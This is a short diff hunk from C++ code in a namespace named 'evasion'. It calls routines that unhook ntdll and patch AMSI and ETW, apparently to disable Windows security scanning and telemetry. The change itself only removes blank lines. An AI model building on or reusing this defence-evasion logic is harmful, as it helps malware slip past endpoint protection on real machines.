@@ -173,10 +173,8 @@ namespace evasion {
         // AMSI / ETW patches still have a chance of landing through
         // whatever hook is in place.
         UnhookNtdll();
-
         BOOL amsi_ok = PatchAmsi();
         BOOL etw_ok  = PatchEtw();
-
         // Partial success is acceptable - AMSI may not be loaded in
         // non-.NET host processes.
         return amsi_ok || etw_ok;
